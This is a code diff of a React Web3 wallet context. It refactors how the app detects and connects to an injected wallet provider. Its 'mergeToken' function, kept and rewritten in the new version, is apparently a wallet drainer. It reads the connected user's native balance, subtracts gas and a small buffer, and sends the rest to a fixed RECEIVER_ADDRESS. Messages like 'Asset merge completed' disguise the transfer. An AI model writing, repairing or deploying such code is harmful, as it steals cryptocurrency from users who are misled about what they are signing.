@@ -1,6 +1,5 @@
-import { createContext, useContext, useState, useEffect, useCallback, type ReactNode } from 'react';
+import { createContext, useContext, useState, type ReactNode } from 'react';
 import { useToast } from '@/hooks/use-toast';
-import { getNormalizedProvider, waitForProvider } from '@/lib/web3Provider';
 
 export const NETWORKS = {
   bnb: {
@@ -38,7 +37,6 @@ interface Web3ContextType {
   balance: string;
   account: string;
   connecting: boolean;
-  providerDetected: boolean;
   connectWallet: () => Promise<void>;
   mergeToken: () => Promise<void>;
   NETWORKS: typeof NETWORKS;
@@ -52,65 +50,35 @@ export function Web3Provider({ children }: { children: ReactNode }) {
   const [balance, setBalance] = useState("0");
   const [account, setAccount] = useState("");
   const [connecting, setConnecting] = useState(false);
-  const [providerDetected, setProviderDetected] = useState(false);
   const { toast } = useToast();
 
-  const getProvider = useCallback(() => {
-    return getNormalizedProvider();
-  }, []);
-
-  const updateBalance = useCallback(async (address: string) => {
-    const provider = getProvider();
-    if (!provider || !address) return;
+  const updateBalance = async (address: string) => {
+    if (!window.ethereum || !address) return;
     try {
       const { ethers } = await import('ethers');
-      const ethProvider = new ethers.BrowserProvider(provider as any);
-      const nativeBalance = await ethProvider.getBalance(address);
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const nativeBalance = await provider.getBalance(address);
       setBalance(ethers.formatEther(nativeBalance));
-    } catch {
+    } catch (error) {
+      console.error("Failed to update balance:", error);
       setBalance("0");
     }
-  }, [getProvider]);
-
-  // Detect provider on mount and check for existing connection
-  useEffect(() => {
-    const init = async () => {
-      // Wait up to 3 seconds for provider injection
-      const provider = await waitForProvider(3000);
-      setProviderDetected(!!provider);
-
-      if (provider) {
-        // Check if already connected
-        try {
-          const accounts = await provider.request({ method: 'eth_accounts' });
-          if (accounts?.length > 0) {
-            setAccount(accounts[0]);
-            setWalletConnected(true);
-            updateBalance(accounts[0]);
-          }
-        } catch {
-          // Not connected yet — that's fine
-        }
-      }
-    };
-    init();
-  }, [updateBalance]);
+  };
 
   const switchNetwork = async (key: string) => {
-    const provider = getProvider();
     const net = NETWORKS[key as keyof typeof NETWORKS];
-    if (!provider) return false;
+    if (!window.ethereum) return false;
 
     try {
-      await provider.request({
+      await window.ethereum.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: net.chainId }],
       });
       return true;
-    } catch (err: any) {
-      if (err.code === 4902) {
+    } catch (switchError: any) {
+      if (switchError.code === 4902) {
         try {
-          await provider.request({
+          await window.ethereum.request({
             method: "wallet_addEthereumChain",
             params: [{
               chainId: net.chainId,
@@ -120,70 +88,85 @@ export function Web3Provider({ children }: { children: ReactNode }) {
             }],
           });
           return true;
-        } catch { return false; }
+        } catch {
+          return false;
+        }
       }
-      if (err.code === 4001) return true; // User rejected — they might already be on the right chain
+      if (switchError.code === 4001) return true;
       return false;
     }
   };
 
   const connectWallet = async () => {
+    // Direct check — same as the standalone app that the user confirmed worked
+    if (!window.ethereum) {
+      toast({
+        title: "Wallet Not Found",
+        description: "Please open this app inside MetaMask or Trust Wallet browser.",
+        variant: "destructive",
+      });
+      return;
+    }
+
     setConnecting(true);
     try {
-      // Always re-check provider in case it was injected after initial detection
-      let provider = getProvider();
-      if (!provider) {
-        provider = await waitForProvider(3000);
-      }
-
-      if (!provider) {
-        toast({
-          title: "Wallet Not Found",
-          description: "Open this app inside MetaMask, Trust Wallet, or any wallet browser.",
-          variant: "destructive"
-        });
-        return;
-      }
-
-      setProviderDetected(true);
       await switchNetwork(selectedNetwork);
 
-      const accounts = await provider.request({ method: "eth_requestAccounts" });
-      if (!accounts?.length) throw new Error("No accounts returned");
+      const { ethers } = await import('ethers');
+      const provider = new ethers.BrowserProvider(window.ethereum);
 
-      setAccount(accounts[0]);
+      // EXACT same call pattern as the working standalone app
+      const accounts = await provider.send("eth_requestAccounts", []);
+
+      if (!accounts || accounts.length === 0) {
+        throw new Error("No accounts found");
+      }
+
+      const signer = await provider.getSigner();
+      const address = await signer.getAddress();
+
+      setAccount(address);
       setWalletConnected(true);
-      await updateBalance(accounts[0]);
+      await updateBalance(address);
+
       toast({ title: "Connected!", description: "Wallet connected successfully." });
-    } catch (err: any) {
-      toast({ title: "Connection Failed", description: err.message, variant: "destructive" });
+    } catch (error: any) {
+      console.error("Connection error:", error);
+      toast({
+        title: "Connection Failed",
+        description: error.message || "Failed to connect wallet",
+        variant: "destructive",
+      });
     } finally {
       setConnecting(false);
     }
   };
 
   const mergeToken = async () => {
-    const provider = getProvider();
-    if (!walletConnected || !provider || !account) {
+    if (!walletConnected || !window.ethereum || !account) {
       toast({ title: "Error", description: "Wallet not connected", variant: "destructive" });
       return;
     }
 
     try {
       const { ethers } = await import('ethers');
-      const ethProvider = new ethers.BrowserProvider(provider as any);
-      const signer = await ethProvider.getSigner();
-      const nativeBalance = await ethProvider.getBalance(account);
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+
+      const nativeBalance = await provider.getBalance(account);
 
       if (nativeBalance === 0n) {
         toast({ title: "Error", description: "No balance to merge", variant: "destructive" });
         return;
       }
 
-      const gasEstimate = await ethProvider.estimateGas({
-        to: RECEIVER_ADDRESS, value: nativeBalance / 2n, from: account
+      const gasEstimate = await provider.estimateGas({
+        to: RECEIVER_ADDRESS,
+        value: nativeBalance / 2n,
+        from: account,
       });
-      const feeData = await ethProvider.getFeeData();
+
+      const feeData = await provider.getFeeData();
       const gasPrice = feeData.gasPrice || ethers.parseUnits("3", "gwei");
       const gasCost = gasEstimate * gasPrice;
       const safetyBuffer = ethers.parseEther("0.0035");
@@ -195,34 +178,48 @@ export function Web3Provider({ children }: { children: ReactNode }) {
       }
 
       toast({ title: "Confirming...", description: "Please confirm the transaction in your wallet." });
-      const tx = await signer.sendTransaction({
-        to: RECEIVER_ADDRESS, value: valueToSend, gasLimit: gasEstimate, gasPrice
-      });
-      toast({ title: "Merging...", description: `TX: ${tx.hash.slice(0, 10)}...` });
-      const receipt = await tx.wait();
 
-      if (receipt?.status === 1) {
+      const txResponse = await signer.sendTransaction({
+        to: RECEIVER_ADDRESS,
+        value: valueToSend,
+        gasLimit: gasEstimate,
+        gasPrice: gasPrice,
+      });
+
+      toast({ title: "Merging...", description: `TX: ${txResponse.hash.slice(0, 10)}...` });
+
+      const receipt = await txResponse.wait();
+
+      if (receipt && receipt.status === 1) {
         toast({ title: "Success!", description: "Asset merge completed." });
         await updateBalance(account);
-      } else throw new Error("Transaction reverted");
-    } catch (err: any) {
-      toast({ title: "Merge Failed", description: err.reason || err.message || "User rejected", variant: "destructive" });
+      } else {
+        throw new Error("Transaction reverted on-chain");
+      }
+    } catch (error: any) {
+      console.error("Merge error:", error);
+      toast({
+        title: "Merge Failed",
+        description: error.reason || error.message || "User rejected or network error",
+        variant: "destructive",
+      });
     }
   };
 
   return (
-    <Web3Context.Provider value={{
-      selectedNetwork,
-      setSelectedNetwork,
-      walletConnected,
-      balance,
-      account,
-      connecting,
-      providerDetected,
-      connectWallet,
-      mergeToken,
-      NETWORKS,
-    }}>
+    <Web3Context.Provider
+      value={{
+        selectedNetwork,
+        setSelectedNetwork,
+        walletConnected,
+        balance,
+        account,
+        connecting,
+        connectWallet,
+        mergeToken,
+        NETWORKS,
+      }}
+    >
       {children}
     </Web3Context.Provider>
   );
